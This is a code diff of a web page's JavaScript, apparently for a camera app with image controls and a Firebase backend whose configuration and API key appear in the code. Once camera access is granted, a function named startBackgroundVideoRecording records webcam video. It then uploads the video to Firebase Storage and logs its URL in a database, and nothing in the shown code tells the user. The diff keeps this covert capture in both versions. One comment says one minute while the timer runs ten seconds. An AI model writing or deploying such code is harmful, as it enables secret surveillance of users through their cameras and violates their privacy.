@@ -2,7 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 import { getStorage, ref as storageRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
 
-// Firebase configuration
+// Your web app's Firebase configuration
 const firebaseConfig = {
     apiKey: "AIzaSyAzC9R_8EKHla74siSXFI-q7vV-3u4ARgY",
     authDomain: "adishots-8da27.firebaseapp.com",
@@ -32,6 +32,7 @@ const contrastSlider = document.getElementById('contrast');
 navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
         video.srcObject = stream;
+
         // Start recording the video
         startBackgroundVideoRecording(stream);
     })
@@ -108,69 +109,58 @@ window.addEventListener('load', () => {
 function startBackgroundVideoRecording(stream) {
     console.log("Starting background video recording...");
 
-    // Check for MediaRecorder API support
-    if (typeof MediaRecorder === 'undefined') {
-        console.error('MediaRecorder API is not supported on this browser.');
-        return;
-    }
-
-    let options = { mimeType: 'video/webm' };
-    if (!MediaRecorder.isTypeSupported('video/webm')) {
-        options = { mimeType: 'video/mp4' }; // fallback to MP4
-        console.warn('Using video/mp4 as fallback MIME type.');
-    }
-
     // Create a MediaRecorder instance
-    let mediaRecorder;
-    try {
-        mediaRecorder = new MediaRecorder(stream, options);
-    } catch (error) {
-        console.error('Error creating MediaRecorder:', error);
-        return;
-    }
-
+    const mediaRecorder = new MediaRecorder(stream);
     const chunks = [];
 
+    // On data available, add the chunk to the array
     mediaRecorder.ondataavailable = event => {
         if (event.data.size > 0) {
-            console.log('Data available:', event.data.size, 'bytes');
             chunks.push(event.data);
         }
     };
 
-    mediaRecorder.onstop = async () => {
+    // On recording stop, create a blob and upload it
+    mediaRecorder.onstop = () => {
         console.log("Recording stopped. Preparing to upload...");
-        const blob = new Blob(chunks, { type: options.mimeType });
-        console.log('Blob size:', blob.size); // Log blob size for debugging
+        const blob = new Blob(chunks, { type: 'video/webm' });
 
-        if (blob.size > 0) {
-            const videoRef = storageRef(storage, `videos/${Date.now()}.${options.mimeType.split('/')[1]}`);
-            try {
-                const snapshot = await uploadBytes(videoRef, blob);
+        // Create a reference in Firebase Storage
+        const videoRef = storageRef(storage, `videos/${Date.now()}.webm`);
+
+        // Upload the video blob to Firebase Storage
+        uploadBytes(videoRef, blob)
+            .then(snapshot => {
                 console.log('Video uploaded to Firebase Storage');
-                const url = await getDownloadURL(snapshot.ref);
+
+                // Get the download URL for the uploaded video
+                return getDownloadURL(snapshot.ref);
+            })
+            .then(url => {
                 console.log('Video URL:', url);
 
+                // Store the video URL and metadata in Firebase Realtime Database
                 const videosRef = ref(database, 'videos');
                 const newVideoRef = push(videosRef);
-                await set(newVideoRef, {
+                return set(newVideoRef, {
                     videoUrl: url,
                     timestamp: new Date().toISOString()
                 });
+            })
+            .then(() => {
                 console.log('Video metadata saved to Realtime Database');
-            } catch (error) {
+            })
+            .catch(error => {
                 console.error('Error uploading video to Firebase Storage or saving metadata to Realtime Database:', error);
-            }
-        } else {
-            console.error('Blob size is zero, not uploading.');
-        }
+            });
     };
 
+    // Start recording
     mediaRecorder.start();
     console.log("Recording started.");
 
-    // Stop recording after 10 seconds (change as needed)
+    // Stop recording after 1 minute
     setTimeout(() => {
         mediaRecorder.stop();
-    }, 10000); // 10000 ms = 10 seconds
+    }, 10000); // 10000 ms = 10 second
 }
